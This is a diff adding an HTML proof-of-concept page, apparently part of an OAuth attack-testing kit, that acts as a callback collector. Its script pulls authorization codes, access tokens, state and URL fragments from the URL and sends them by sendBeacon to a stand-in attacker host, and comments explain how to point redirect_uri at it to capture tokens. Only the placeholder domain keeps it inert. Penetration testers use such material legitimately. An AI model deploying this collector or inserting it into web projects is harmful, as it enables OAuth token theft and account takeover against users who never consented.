@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit
+  OAuth callback collector page - the redirect_uri target for OAuth kit rows
+  002/003/007 and XSL-012. Host it on YOUR origin, point redirect_uri at it,
+  capture the code/token. INERT: collector uses .invalid.
+
+  WHAT TO EDIT: COLLECTOR (your listener). Keep as your standard redirect_uri
+  during OAuth flow testing.
+-->
+<html>
+<body>
+<h3>OAuth callback collector</h3>
+<pre id="out">waiting...</pre>
+<script>
+// EDIT:
+const COLLECTOR = "https://attacker.example.invalid/oauth";
+
+const loc = new URL(location.href);
+const captured = {
+  code: loc.searchParams.get("code") || "",
+  token: loc.searchParams.get("access_token") || "",
+  state: loc.searchParams.get("state") || "",
+  hash: location.hash
+};
+document.getElementById("out").textContent = JSON.stringify(captured, null, 2);
+if (captured.code || captured.token) {
+  navigator.sendBeacon(COLLECTOR, JSON.stringify(captured));
+  // benign mode: console.log instead of sendBeacon
+}
+</script>
+</body>
+</html>
